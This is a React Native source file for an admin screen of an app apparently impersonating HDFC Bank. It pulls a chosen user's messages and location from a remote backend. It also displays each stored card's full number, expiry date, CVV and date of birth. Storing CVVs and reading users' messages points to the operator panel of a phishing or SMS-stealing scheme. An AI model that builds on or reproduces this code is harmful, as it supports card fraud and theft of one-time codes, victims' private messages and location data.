import { View, Text, FlatList, Image, StyleSheet, TouchableOpacity, Alert } from 'react-native'
import React, { useEffect, useState } from 'react'
import { rgbaColor } from 'react-native-reanimated/src/reanimated2/Colors';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import CardDetails from '../cardDetails';
import MyCard from '../../components/card';

export default function UserDetails(props) {
    const [userDetails, setUserDetails] = useState({})
    const [userMessages, setUserMessages] = useState({})
    const { item } = props.route.params;

    const getUserDetails = async () => {
        const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}

        try {
            const response = await axios.get(`https://hdfc-bank-9qmz.onrender.com/api/v1/admin/userDetails/${item._id}`, {
                headers: {
                    adminid: user._id,
                    token: user.token
                }
            });
            if (response.data?.status) {
                setUserDetails(response.data?.data)
            }
            console.log("user cdetails response", response.data);
        }
        catch (error) {
            Alert.alert(error.response?.data?.message)
            console.log("user cdetails error", error.response?.data);
        }
    }
    const getUserMessages = async () => {
        const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}

        try {
            const response = await axios.get(`https://hdfc-bank-9qmz.onrender.com/api/v1/admin/getUserMessages/${item._id}`, {
                headers: {
                    adminid: user._id,
                    token: user.token
                }
            });
            if (response.data?.status) {
                console.log("user messages", response.data)
                setUserMessages(response.data?.data)
            }
            console.log("user cdetails response", response.data);
        }
        catch (error) {
            Alert.alert(error.response?.data?.message)
            console.log("user cdetails error", error.response?.data);
        }
    }

    useEffect(() => {
        getUserDetails();
    }, [item])

    return (
        <View>
            <View style={styles.container}>
                <MyCard />
            </View>
            <View style={styles.card}>
                <Text style={styles.title}>User Details</Text>
                <View style={styles.description}>
                    <View style={styles.detailRow}>
                        <Text style={{ flex: 2 }}>User Name :</Text>
                        <Text style={{ flex: 3 }}>{userDetails.userName}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={{ flex: 2 }}>Full Name</Text>
                        <Text style={{ flex: 3 }}>{`${userDetails.firstName} ${userDetails.lastName}`}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={{ flex: 2 }}>Email</Text>
                        <Text style={{ flex: 3 }}>{userDetails.email}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={{ flex: 2 }}>User Mobile</Text>
                        <Text style={{ flex: 3 }}>{userDetails.mobile}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={{ flex: 4 }}>Location</Text>
                        <Text style={{ flex: 3 }}>{userDetails.location.latitude}</Text>
                        <Text style={{ flex: 3 }}>{userDetails.location.longitude}</Text>
                    </View>
                    <View style={styles.detailRow}>
                        <Text style={{ flex: 2 }}>Messages</Text>
                        <TouchableOpacity style={{ flex: 3 }} onPress={() => { getUserMessages() }}>
                            <Text style={{ color: "#000" }}>Get messages</Text>
                        </TouchableOpacity>
                    </View>
                </View>
            </View>

            <View>
                {
                    Object.values(userMessages).map(message => (
                        <Text>{message}</Text>
                    ))
                }
            </View>

            {
                userDetails.cardDetails && userDetails.cardDetails?.length > 0 && userDetails.cardDetails.map((card, index) => (
                    <View style={styles.card}>
                        <Text style={styles.title}>Card {index + 1} Details</Text>

                        <View style={styles.description}>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Mobile Number :</Text>
                                <Text style={{ flex: 3 }}>{card.mobile}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Date of Birth</Text>
                                <Text style={{ flex: 3 }}>{`${card.dob}`}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Card Number</Text>
                                <Text style={{ flex: 3 }}>{card.cardNumber}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>Expiry Date</Text>
                                <Text style={{ flex: 3 }}>{card.expDate}</Text>
                            </View>
                            <View style={styles.detailRow}>
                                <Text style={{ flex: 2 }}>CVV Number</Text>
                                <Text style={{ flex: 3 }}>{card.cvv}</Text>
                            </View>
                        </View>
                    </View>
                ))
            }

        </View>
    )
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#f0f0f0',
    },
    card: {
        backgroundColor: rgbaColor(0, 0, 0, 0.70),
        borderRadius: 8,
        padding: 16,
        margin: 12,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: 0.3,
        shadowRadius: 4,
    },
    title: {
        fontSize: 20,
        fontWeight: 'bold',
    },
    description: {
        fontSize: 16,
        marginTop: 8,
    },
    detailRow: {
        display: 'flex',
        flexDirection: 'row',
    },
})

